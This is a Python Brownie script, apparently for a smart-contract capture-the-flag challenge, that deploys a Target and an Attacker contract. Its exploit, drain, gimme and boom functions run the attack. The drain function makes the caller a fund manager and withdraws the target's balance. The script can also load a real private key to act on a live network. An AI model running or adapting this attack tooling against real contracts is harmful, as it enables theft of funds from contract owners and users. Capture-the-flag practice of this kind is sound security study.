import os
import sys

import brownie
from brownie import accounts, Contract, Attacker, Target

from dotenv import load_dotenv
load_dotenv()

# API instance
PRIVATE_KEY = os.getenv("PRIVATE_KEY")

TARGET_ADDRESS = os.getenv("TARGET_ADDRESS")
if TARGET_ADDRESS is None:
    # Address from deploy. Deterministic based on nonce and owner
    TARGET_ADDRESS = "0x3194cBDC3dbcd3E11a07892e7bA5c3394048Cc87"

ATTACKER_ADDRESS = os.getenv("ATTACKER_ADDRESS")
if ATTACKER_ADDRESS is None:
    # Address from deploy.
    ATTACKER_ADDRESS = "0xb6EA4627e5feFF6DE2F9b863DB7CF504Bdb3C2cB"

if PRIVATE_KEY is not None:
    try:
        input("Using real account! Press Ctrl-c to cancel or enter to proceed...")
    except KeyboardInterrupt:
        sys.exit(1)
    my_account = accounts.add(PRIVATE_KEY)
else:
    my_account = accounts[-1]

OWNER_PUBLIC_KEY = os.getenv("OWNER_PUBLIC_KEY")
if OWNER_PUBLIC_KEY is not None:
    ctf_account = accounts.at(OWNER_PUBLIC_KEY, force=True)
else:
    ctf_account = accounts[0]

print("Using my account at", my_account)
print("Using CTF account at", ctf_account)
print("Using Target contract at", TARGET_ADDRESS)
print("Using Attacker contract account at", ATTACKER_ADDRESS)


def deploy_attacker(target):
    Attacker.deploy(target, {"from": my_account})


def deploy_target():
    return Target.deploy(ctf_account, my_account, {"from": ctf_account})


def deploy():
	target = deploy_target()
	deploy_attacker(target)

def query():
    try:
        target_contract = Contract.from_abi("TargetContract", TARGET_ADDRESS, Target.abi)
        print("Target address:\t", TARGET_ADDRESS)
        print("Target balance:\t", target_contract.balance())
    except brownie.exceptions.ContractNotFound:
        print("Target contract not found at address", TARGET_ADDRESS)
    except ValueError:
        pass

    try:
        attacker_contract = Contract.from_abi("Attacker", ATTACKER_ADDRESS, Attacker.abi)
    except brownie.exceptions.ContractNotFound:
        print("Attacker contract not found at address", ATTACKER_ADDRESS)
        return
    else:
        print("Attacker balance:", attacker_contract.balance())
        print("Attacker target:", attacker_contract.target())


def exploit():
    try:
        attacker_contract = Contract.from_abi("Attacker", ATTACKER_ADDRESS, Attacker.abi)
    except brownie.exceptions.ContractNotFound:
        print("Attacker contract not found")
        return
    else:
        attacker_contract.exploit({"from": my_account})


def drain():
    # Get the funds after exploiting
    target_contract = Contract.from_abi("TargetContract", TARGET_ADDRESS, Target.abi)
    target_contract.addFundManager(my_account, {"from": my_account})
    target_contract.withdraw({"from": my_account})


def gimme():
    try:
        attacker_contract = Contract.from_abi("Attacker", ATTACKER_ADDRESS, Attacker.abi)
    except brownie.exceptions.ContractNotFound:
        print("Attacker contract not found")
        return
    else:
        attacker_contract.gimme({"from": my_account})


def boom():
    try:
        attacker_contract = Contract.from_abi("Attacker", ATTACKER_ADDRESS, Attacker.abi)
    except brownie.exceptions.ContractNotFound:
        print("Attacker contract not found")
        return
    else:
        attacker_contract.boom({"from": my_account})


def main():
    pass
